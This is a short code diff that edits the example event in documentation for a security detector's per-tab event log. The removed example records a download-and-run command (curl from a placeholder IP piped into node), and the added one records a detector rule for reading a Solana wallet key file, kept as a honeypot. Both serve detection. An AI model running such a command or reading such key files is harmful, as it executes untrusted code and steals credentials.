@@ -108,7 +108,7 @@ under \`<state>/events/<tabId>/\`.
 
 ## Example
 \`\`\`json
-{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"loader.pipe-to-interpreter","summary":"download piped to an interpreter: sh -c curl -s http://192.0.2.10/p | node","proc":{"pid":388,"ppid":387,"exe":"/usr/bin/dash","argv":["sh","-c","curl -s http://192.0.2.10/p | node"],"lineage":[{"pid":387,"exe":"/bin/sh"}]},"cause":[41]}
+{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"credential.honeypot-read","summary":"honeypot read: /home/agent/.config/solana/id.json","proc":{"pid":388},"file":{"path":"/home/agent/.config/solana/id.json","op":"read"},"cause":[41]}
 \`\`\`
 `;
 }
